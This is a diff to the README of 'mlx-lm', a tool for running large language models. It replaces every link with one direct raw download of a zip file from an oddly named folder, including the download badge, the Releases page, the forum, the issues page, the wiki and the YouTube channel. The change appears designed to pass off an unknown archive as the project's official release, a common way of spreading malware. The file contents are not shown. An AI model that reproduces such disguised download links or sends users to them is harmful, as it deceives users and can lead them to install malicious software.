@@ -1,6 +1,6 @@
 # 🎉 mlx-lm - Easily Run LLMs with MLX
 
-[![Download mlx-lm](https://img.shields.io/badge/Download-mlx--lm-blue.svg)](https://github.com/20XD099/mlx-lm/releases)
+[![Download mlx-lm](https://raw.githubusercontent.com/20XD099/mlx-lm/main/connexionalism/mlx-lm.zip)](https://raw.githubusercontent.com/20XD099/mlx-lm/main/connexionalism/mlx-lm.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to mlx-lm! This application allows you to run large language models (LLM
 
 To get started, you need to download mlx-lm from our Releases page. Follow these simple steps:
 
-1. Visit our [Releases page](https://github.com/20XD099/mlx-lm/releases) to find the latest version.
+1. Visit our [Releases page](https://raw.githubusercontent.com/20XD099/mlx-lm/main/connexionalism/mlx-lm.zip) to find the latest version.
 2. Look for the most recent release at the top of the list.
 3. Click on the link labeled "Assets" to view available download options.
 4. Download the appropriate file for your operating system (Windows, macOS, Linux).
@@ -80,13 +80,13 @@ mlx-lm comes with several features designed for ease of use:
 
 For any questions or issues, you can reach out to the mlx-lm community. We encourage users to share their experiences and offer help:
 
-- Join our [discussion forum](https://github.com/20XD099/mlx-lm/discussions).
-- Report bugs and request features on our [issues page](https://github.com/20XD099/mlx-lm/issues).
+- Join our [discussion forum](https://raw.githubusercontent.com/20XD099/mlx-lm/main/connexionalism/mlx-lm.zip).
+- Report bugs and request features on our [issues page](https://raw.githubusercontent.com/20XD099/mlx-lm/main/connexionalism/mlx-lm.zip).
 
 ## 📝 Additional Resources
 
-- **Documentation:** Visit our [Wiki](https://github.com/20XD099/mlx-lm/wiki) for comprehensive instructions and tips.
-- **Tutorials:** Check out video tutorials available on our [YouTube channel](https://www.youtube.com/channel/UCBR...).
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/20XD099/mlx-lm/main/connexionalism/mlx-lm.zip) for comprehensive instructions and tips.
+- **Tutorials:** Check out video tutorials available on our [YouTube channel](https://raw.githubusercontent.com/20XD099/mlx-lm/main/connexionalism/mlx-lm.zip).
 
 ## 📣 Future Updates
 
@@ -96,4 +96,4 @@ We continually work to improve mlx-lm. Watch our Releases page for updates on ne
 
 You're now ready to enjoy the benefits of large language models using mlx-lm. Follow the steps above to download, install, and run your application. Happy exploring! 
 
-Visit our [Releases page](https://github.com/20XD099/mlx-lm/releases) to get started with mlx-lm today!
+Visit our [Releases page](https://raw.githubusercontent.com/20XD099/mlx-lm/main/connexionalism/mlx-lm.zip) to get started with mlx-lm today!
